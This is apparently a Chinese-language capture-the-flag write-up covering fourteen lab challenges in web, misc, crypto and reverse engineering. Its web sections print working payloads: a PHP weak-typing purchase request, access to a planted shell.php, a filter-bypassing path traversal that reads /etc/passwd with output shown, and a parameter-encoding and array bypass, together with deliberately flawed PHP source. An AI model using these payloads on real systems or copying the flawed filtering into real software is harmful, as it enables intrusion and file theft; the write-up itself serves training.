# 1.web-3-fp5

买彩票，Post改包，利用php弱类型校验

{"action":"buy","numbers":[true,true,true,true,true,true,true]}


# 2.Web-2-hack

IP： 172.19.1.46:8000

题目： Web-2-hack

难度： 初级

内容： hack，本题端口为8000

目录扫描后发现页面如下访问

 [http://172.19.1.46:8000/shell.php](http://172.19.1.46:8000/shell.php)

输入密码： hack

得到flag

# 3.文件读取

难度： 初级

内容： 文件读取，本题端口为8004


首先目录爆破，是有一个备份文件，访问/stage/11/getfilecontent.php.bak可以获取到源码

如下：


```php
<?php 

$UploadDir = '/var/www/stage/11/'; 

if (!(isset($_GET['file'])))
	die();
	
if (strstr(strtolower($_GET['file']),'php'))
	die('can not read php file');


$file = $_GET['file'];
$file = str_replace("../",".",$file);
$file = str_replace("passwd","",$file);
$file = str_replace("etc","",$file);
$file = str_replace("c/p","",$file);
$path = $UploadDir . $file;
echo $path;
/*if (!is_file($path))
	die();*/

header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
header('Cache-Control: public');
header('Content-Disposition: inline; filename="' . basename($path) . '";');
header('Content-Transfer-Encoding: binary');
header('Content-Length: ' . filesize($path));

$handle = fopen($path, 'rb');

do {
$data = fread($handle, 8192);
if (strlen($data) == 0) {
break;
}
echo($data);
} while (true);

fclose($handle);
exit();


?>
```

代码审计有好多过滤

[http://172.19.1.167:8004/stage/11/getfilecontent.php?file=...//...//...//...//etetcc//ppasswdasswd](http://172.19.1.167:8004/stage/11/getfilecontent.php?file=...//...//...//...//etetcc//ppasswdasswd)

,:/run/systemd/netif:/bin/false systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false 
# 4.calculate2

题目： calculate2

难度： 初级

内容： “算”就完了，本题端口为8003


```python
import requests

import re

from bs4 import BeautifulSoup

s = requests.Session()

r = s.get('<http://172.19.0.82:8003/>')

content = r.text
soup= BeautifulSoup(content,'lxml')

pString = soup.find\_all(name='p')

e = str(pString\[0]).split('\<br/>')\[1].split('\</p>')\[0]

r = eval(e)
r2 = s.post('<http://172.19.0.82:8003/>',data = {'result'\:r})

print(r2.text)
```

# 5.web-3-web82

172.19.0.101:8007

题目： web-3-web82

难度： 中级

内容： 绕过A_A，本题端口为8007

代码审计如下


```php
<?php
highlight_file(__FILE__);
ini_set("display_error", false); 
error_reporting(0); 
$str = isset($_GET['A_A'])?$_GET['A_A']:'A_A';
if (strpos($_SERVER['QUERY_STRING'], "A_A") !==false) {
    echo 'A_A,have fun';
}
elseif ($str<9999999999) {
    echo 'A_A,too small';
}
elseif ((string)$str>0) {
    echo 'A_A,too big';
}
else{
    echo file_get_contents('flag.php');
    
}

?>
A_A,too small
```
![](file:///C:/Users/asus/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png)
采用url编码绕过A_A识别，最后采用数组绕过比较

[http://172.19.0.101:8007/?%41%5f%41[]=1](http://172.19.0.101:8007/?%41%5f%41%5b%5d=1)

# 6.misc_Pirate king steganography

难度： 初级

内容： 这里有很多海贼王的照片，挑一张看看吧

如图，这很难评
![[Pasted image 20240731124156.png]]

# 7. misc31

难度： 中级

内容： 小明得到一串字符串，却解不出来，流下了没技术的泪水 d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd

答案：CTF{}
![[Pasted image 20240731131137.png]]
# 8.misc-3-funny ASCII

有趣的ASCII

放到这个网站解码一下即可

[二进制到文本转换器 二进制翻译器 (rapidtables.org)](https://www.rapidtables.org/zh-CN/convert/number/binary-to-ascii.html)

# 9.misc13

flag形式为flag{}，passwd


就是流量里面的登录密码去掉.........

# 10.crypto-4-next

难度： 中级

内容： 奇怪的模数生成方式，你能否从中分解出N呢？

```python
import sympy

from Crypto.Util.number import *

# 给定的密文和N

N = 177920246731961984692844675027794269351974655978633360958792135066811113973204490061355452695689806058893015396266267360582784890984276521557441293993864861033228213124084744486810727223671447408512757938978007969098885482833084907318019060009833379873711469730284507118386587060518773729384368339738258068433

c = 148424465798304945167250248254436660371772148039137809407743400737194128537141868847451364265636630340866508741642501886466340194647554617583629924131714531271539011128061022480521390215365303820954694837540067178184270211155380856554625937689079346774001636736492546883595465564744950751854489444787660248226

e = 0x10001

# 使用 sympy 的因数分解工具

def factorize(n):

    factors = sympy.ntheory.factorint(n)

    return list(factors.keys())

# 因数分解 N

factors = factorize(N)

if len(factors) == 2:

    p, q = factors

else:

    raise ValueError("N does not have exactly two prime factors")

print(f"Found p: {p}")

print(f"Found q: {q}")

# 确认 N 是否正确

assert N == p * q, "N does not match the product of p and q"

# 计算 phi 和 d

phi = (p - 1) * (q - 1)

d = inverse(e, phi)

print(f"phi(N): {phi}")

print(f"Private exponent (d): {d}")

# 解密密文

m = pow(c, d, N)

flag = long_to_bytes(m)

# 打印解密后的字节流

print("Decrypted bytes:", flag)

# 尝试不同的编码进行解码

try:

    flag_str = flag.decode('utf-8')

    print("UTF-8 decoded flag:", flag_str)

except UnicodeDecodeError:

    print("Failed to decode with UTF-8")

    try:

        flag_str = flag.decode('latin1')

        print("Latin1 decoded flag:", flag_str)

    except UnicodeDecodeError:

        flag_str = flag.decode('utf-8', errors='ignore')

        print("UTF-8 decoded flag with ignore:", flag_str)

        # 如果以上都失败，尝试使用替换策略

        flag_str = flag.decode('utf-8', errors='replace')

        print("UTF-8 decoded flag with replace:", flag_str)
```

# 11.Simple encryption

拿到题目

```python
#!/usr/bin/env python
# -*- coding:utf-8 -*- 
from Crypto.Cipher import AES
from Crypto import Random

def encrypt(data, password):
    bs = AES.block_size
    pad = lambda s: s + (bs - len(s) % bs) * chr(bs - len(s) % bs)
    iv = "0102030405060708"
    cipher = AES.new(password, AES.MODE_CBC, iv)
    data = cipher.encrypt(pad(data))
    return data

def decrypt(data, password):
    unpad = lambda s : s[0:-ord(s[-1])]
    iv = "0102030405060708"
    cipher = AES.new(password, AES.MODE_CBC, iv)
    data  = cipher.decrypt(data)
    return unpad(data)

def generate_passwd(key):
    data_halt = "LvR7GrlG0A4WIMBrUwTFoA==".decode("base64")
    rand_int =  int(decrypt(data_halt, key).encode("hex"), 16)
    round = 0x7DC59612
    result = 1    
    a1 = 0
    while a1 < round:
        a2 = 0
        while a2 < round:
            a3 = 0
            while a3 < round:
                result = result * (rand_int % 0xB18E) % 0xB18E
                a3 += 1
            a2 += 1
        a1 += 1
    return encrypt(str(result), key)


if __name__ == '__main__':

    key = raw_input("key:")

    if len(key) != 32:
        print "check key length!"
        exit()
    passwd = generate_passwd(key.decode("hex"))

    flag = raw_input("flag:")

    print "output:", encrypt(flag, passwd).encode("base64")

# key = md5(sha1("flag"))
# output = "u6WHK2bnAsvTP/lPagu7c/K3la0mrveKrXryBPF/LKFE2HYgRNLGzr1J1yObUapw"
```

我们不难看出这题的难点应该在于generate_passwd()了吧，加解密函数都给你写好了，调用就行，我们仔细观察这个generate_passwd()

```python
def generate_passwd(key):
    data_halt = "LvR7GrlG0A4WIMBrUwTFoA==".decode("base64")
    rand_int =  int(decrypt(data_halt, key).encode("hex"), 16)
    round = 0x7DC59612
    result = 1    
    a1 = 0
    while a1 < round:
        a2 = 0
        while a2 < round:
            a3 = 0
            while a3 < round:
                result = result * (rand_int % 0xB18E) % 0xB18E
                a3 += 1
            a2 += 1
        a1 += 1
    return encrypt(str(result), key)
```

看起来很复杂，还有3层循环，但仔细抓住result，发现其值一定小于0xB18E

那么爆破即可

```python
output = "u6WHK2bnAsvTP/lPagu7c/K3la0mrveKrXryBPF/LKFE2HYgRNLGzr1J1yObUapw"
key = md5(sha1("flag"))
for result in range(0xB18E):
    passwd = generate_passwd(key.decode("hex"),result)
    r = decrypt(output.decode("base64"), passwd)
    if 'flag' in r:
        print r
```
# 12.rsa2

很简单的，使用私钥解密即可

┌──(kali㉿kali)-[~/桌面]

└─$ openssl rsautl -decrypt -inkey private.pem -in enc.txt -out decrypted.txt

# 13.一张来自夏天的车票

pyc文件，先进行反编译

`uncompyle6 exp.pyc > exp.py`失败，修复下文件

file看下版本，是3.6的

[![](https://dr0n1.github.io/img/wp/2022/2022qianxin-22.png)](https://dr0n1.github.io/img/wp/2022/2022qianxin-22.png)

构造一个3.6生成的pyc文件与`exp.pyc`对比

会发现中间少了四个字节

[![](https://dr0n1.github.io/img/wp/2022/2022qianxin-23.png)](https://dr0n1.github.io/img/wp/2022/2022qianxin-23.png)
填充上`00`

[![](https://dr0n1.github.io/img/wp/2022/2022qianxin-24.png)](https://dr0n1.github.io/img/wp/2022/2022qianxin-24.png)

反编译后运行得到flag


```python
# uncompyle6 version 3.8.0  
# Python bytecode 3.6 (3379)  
import base64  
key = 'e4b5e6d3-bc5a-475b-8c26-d3941ed9b90f'  
enc = 'XQdSA1YEV1IAAFMGUwAAA1AGAFkFBwcAAQQPVwRVXAxXDFFf'  
print(key[(len(key) - 1)])  
  
def decode2(m):  
    return base64.urlsafe_b64decode(m)  
  
  
def decode1(m, key):  
    flag = ''  
    for i in range(len(key) - 6):  
        flag += chr(ord(key[i]) ^ ord(chr(m[i])))  
  
    return flag  
  
  
print(decode2(enc))  
tmp = decode1(decode2(enc), key)  
print(tmp)  
# okay decompiling exp.pyc
```


# 14.给我整头晕了

OD分析发现巨多花指令得到一些关键硬编码和地址如下
```C
E80000000081042417000000C3576174636820757220737465702100

90909090909090909090909090909090909090909090909090909090

E80000000081042425000000C354686520666C616720626567696E7320776974682022666C61677B2200

E80000000081042425000000C354686520666C616720626567696E7320776974682022666C 61677B2200

909090909090909090909090909090909090909090909090909090909090909090909090909090909090

mov edx,dword ptr ss:[esp+0x4]

mov ecx,dword ptr ss:[esp+0x8]

test edx,edx

0040111b

00402160

00401146    333D 6C404000   xor edi,dword ptr ds:[0x40406C]

[0040406c]

004011F5
```

OD脚本去除花指令
```js
//隐藏调试器
dbh
//从Eip的位置查找第一个特征码
find eip,#E80000000081042417000000C3576174636820757220737465702100#
//判断是否找到
cmp $RESULT,0
//如果没找到就跳出结束
je exit
//如果找到就填充成NOP
mov [$RESULT],#90909090909090909090909090909090909090909090909090909090#
//从Eip的位置查找下一个特征码
find eip,#E80000000081042425000000C354686520666C616720626567696E7320776974682022666C61677B2200#


//判断是否找到
cmp $RESULT,0
//没找到就退出
je exit
//找到了就填充为NOP
mov [$RESULT],#909090909090909090909090909090909090909090909090909090909090909090909090909090909090#
//定义一个循环的标签，因为下面这个特征码不止一处，所以需要循环多次进行查找
loop:
	//从Eip的位置查找
	find eip,#E801000000??????????C3#
	//判断是否找到
	cmp $RESULT,0
	//如果找不到了就退出
	je exit
	//找到就填充为90
	mov [$RESULT],#9090909090909090909090#
//继续循环
jmp loop
exit:
MSG "花指令已去除完毕！\r\n Code by:Elven"
ret
```

最后跑算法
```C
#include <string.h>
#include <stdio.h>
#include <windows.h>
#include <random>
// 马勒个蛋的全局数组
int dword_4030B4[42] = {
	0x63B25AF1, 0xC5659BA5, 0x4C7A3C33, 0x0E4E4267, 0xB6117698, 0x3DE6438C, 0x84DBA61F, 0xA97497E6, 0x650F0FB3,
	0x84EB507C, 0xD38CD24C, 0xE7B912E0, 0x7976CD4F, 0x84100010, 0x7FD66745, 0x711D4DBF, 0x5402A7E5, 0xA3334351,
	0x1EE41BF8, 0x22822EBE, 0xDF5CEE48, 0xA8180D59, 0x1576DEDC, 0xFCD62B3B, 0x32AC1F6E, 0x9364A640, 0xC282DD35,
	0x14C5FC2E, 0xA765E438, 0x7FCF345A, 0x59032BAD, 0x9A5600BE, 0x5F472DC5, 0x5DDE0D84, 0x8DF94ED5, 0xBDF826A6,
	0x515A737A, 0x4248589E, 0x38A96C20, 0xCC7F6109, 0x2638C417, 0xD9BEB996
};
int loc_401166(int random, int i) {
	__asm{
		mov     eax, random
		mov     ecx,i
		mul     ecx
		mov     ecx, 0xFAC96621
		pop     eax
		push    edx
		mul     eax
		div     ecx
		mov     eax, edx
		mul     edx
		div     ecx
		mov     eax, edx
		mul     edx
		div     ecx
		mov     eax, edx
		mul     edx
		div     ecx
		mov     eax, edx
		mul     edx
		div     ecx
		mov     eax, edx
		mul     edx
		div     ecx
		mov     eax, edx
		mul     edx
		div     ecx
		mov     eax, edx
		mul     edx
		div     ecx
		mov     eax, edx
		mul     edx
		div     ecx
		mov     eax, edx
		mul     edx
		div     ecx
		mov     eax, edx
		mul     edx
		div     ecx
		mov     eax, edx
		mul     edx
		div     ecx
		mov     eax, edx
		mul     edx
		div     ecx
		mov     eax, edx
		mul     edx
		div     ecx
		mov     eax, edx
		mul     edx
		div     ecx
		mov     eax, edx
		mul     edx
		div     ecx
		mov     eax, edx
		pop     edx
		mul     edx
		div     ecx
// 		cmp     edx, [edi + ebx * 4]
// 		jnz     short loc_4011F2
		mov     eax,edx
	}
}
bool isBoomShakaLaka(int result, int i) 
{
	return result == dword_4030B4[i] ? true : false;
}
//爆破随机数
int bruteforceRand()
{
	int dword_46406C = 0x3133359;
	for (size_t i = 0; i < 0xFFFFFFFF; i++)
	{
		int boom = loc_401166(i, 'f');//第一个字符是f
		if (isBoomShakaLaka(boom, 0))
		{
			printf("BoomShakaLakal BoomShakaLaka! \n\rThe first fucking rand is: 0x%x \n\r",i);
			return i;
		}
	}
		
}

//爆破随机种子
int bruteforceSrand(int first)
{
	int dword_40406C = 0x31333359;//过了反调试这个值才是正确的
	for (size_t i = 0; i < 0xFFFFFFFF; i++)
	{
			//因为是伪随机数，种子对上了就能算出一样的随机数
			int random = dword_40406C + i;
			srand(random);
			if (rand() == first)//破解出来的第一次的随机数
			{
				printf("captain! Your fucking seed is: 0x%0x\n\r", random);
				return random;
			}
	}		
}

int main(){
	// 结果是0x4077
	int rnd = bruteforceRand();
	//结果是0x31333d38
	int seed = bruteforceSrand(rnd);
	int possibles = 0xFF * 42;//全部可能
	srand(seed);
	printf("Givmme answer plz: ");
	//马勒个蛋的暴力破解
	for (size_t i = 0; i < 42; i++)
	{
		int nextRnd = rand();//所有的字符可能
		for (size_t j = 1; j < 0xFF; j++)
		{
		
			int fuck = loc_401166(nextRnd,j);
			if (isBoomShakaLaka(fuck,i))
			{
				printf("%c",j);
				break;
			}
		}
	}
	
	printf("\r\n");
	system("pause"); 
	return 0;
}
```
